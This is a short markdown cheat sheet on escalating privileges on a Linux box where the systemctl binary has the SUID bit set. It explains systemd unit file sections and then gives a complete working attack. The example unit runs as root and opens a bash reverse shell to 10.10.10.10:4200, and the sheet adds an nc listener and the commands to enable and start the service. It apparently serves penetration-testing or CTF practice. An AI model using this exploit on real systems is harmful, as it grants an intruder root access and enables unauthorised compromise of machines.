# Create a linux service
You gained access to a box and noticed that the `systemctl` binary has the SUID bit set.

Complete documentation: [Systemd.io]("https://systemd.io")

## File Syntax
A service file consists of 3 necessary sections `[unit]`, `[Service]`, and `[Install]`

### [Unit]
Contains metadata

| Field | Description |
| ----- | ----------- |
| `Description` | Title of the service |
| `After` | Start service after another target service |
| `Before` | Opposite of After |

### [Service]
Details about execution and termination of service

| Field | Description |
| ----- | ----------- |
| `ExecStart` | Command executed when the service starts |
| `ExecReload` | Optionally specify how a service restarts |
| `Type` | Options are: `simple`, `exec`, `forking`, `oneshot`, `dbus`, `notify`' `idle` |
| `Restart` | Options are: `no`, `on-success`, `on-failure`, `on-abnormal`, `on-watchdog`, `on-abort`, `always` |

### [Install]
Handles the installation

| Field | Description |
| ----- | ----------- |
| `WantedBy` | Similar to before / after but specifies systemd-eqivalent run levels. `default.target` is common. |
| `RequiredBy` | Similar to WantedBy, but will fail if not found |

## Example service
This is done by creating a new file with the `.service` extension:

1. Create a file called `root.service`
```sh
[unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4200 0>&1'

[Install]
WantedBy=multi-user.target
```

2. Start your listener:
```sh
nc -lvnp 4200
```

3. Enable and start the malicious service:
```sh
systemctl enable /tmp/root.service
systemctl start root
```
